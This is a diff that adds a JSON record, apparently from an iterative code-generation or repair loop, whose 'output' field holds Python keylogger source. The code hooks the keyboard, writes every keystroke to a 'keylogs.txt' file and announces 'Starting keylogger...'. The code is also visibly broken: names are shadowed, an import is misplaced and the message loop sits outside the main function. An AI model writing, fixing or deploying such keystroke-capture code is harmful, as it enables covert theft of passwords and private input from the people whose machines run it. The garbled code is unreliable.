@@ -1,0 +1,8 @@
+{
+  "output": "import os\nimport tempfile\nfrom win32api import SetWinEventHook, PumpMessages\nfrom pywinhook import HookManager as hm\nglobal log_file_path\ndef create_log_file():\n    global log_file_path\n    script_dir = os.path.dirname(os.path.abspath(__file__))\n    log_file_path = os.path.join(script_dir, 'keylogs.txt')\ndef on_key_event(event):\n    try:\n        with open(log_file_path, 'a') as log_file:\n            if event.Key == 13:\n                log_file.write('[ENTER]\n')\n            elif event.Key == 8:\n                log_file.write('[BACKSPACE]\n')\n            elif event.Key in [0x14, 0xFA]:\n                log_file.write('[SHIFT]\n')\n            else:\n                log_file.write(event.Key)\n        print('Key captured:', event.Key)\n    except Exception as e:\n        print(f'Error logging key: {e}')\ndef main():\n    create_log_file()\n    hm = hm()\n    hm.KeyDown = on_key_event\n    hm.HookKeyboard()\n    print('Starting keylogger...')\nPumpMessages()\n\nif __name__ == '__main__':\n    main()",
+  "notes": "Fixed backspace key handling.",
+  "applied_fixes": [
+    "iteration4_issue1"
+  ],
+  "iterations": 5
+}
